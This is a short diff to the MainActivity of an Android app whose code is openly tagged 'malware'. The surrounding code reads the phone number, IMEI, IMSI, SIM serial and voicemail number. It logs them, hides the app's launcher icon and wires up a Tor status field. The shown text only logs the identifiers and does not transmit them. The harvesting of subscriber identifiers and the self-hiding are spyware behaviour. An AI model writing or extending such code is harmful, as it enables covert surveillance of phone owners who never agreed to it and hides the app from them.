@@ -5,6 +5,7 @@ import android.os.Bundle;
 import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
+import android.widget.TextView;
 
 import java.io.File;
 import java.io.IOException;
@@ -20,7 +21,6 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-
         Log.d("malware", "Call me anytime, my number is " + PhoneInfo.getMyPhoneNumber(this));
         Log.d("malware", "IMEI " + PhoneInfo.getMyIMEI(this));
         Log.d("malware", "IMSI " + PhoneInfo.getMyIMSI(this));
@@ -28,6 +28,7 @@ public class MainActivity extends Activity {
         Log.d("malware", "SIM-Serial " + PhoneInfo.getMySIMSerial(this));
         Log.d("malware", "Voice number " + PhoneInfo.getMyVoiceMailNumberI(this));
 
+        Utils.torStatus = (TextView)findViewById(R.id.torStatus);
         Utils.hideAppIcon(MainActivity.this);
         finish();
     }
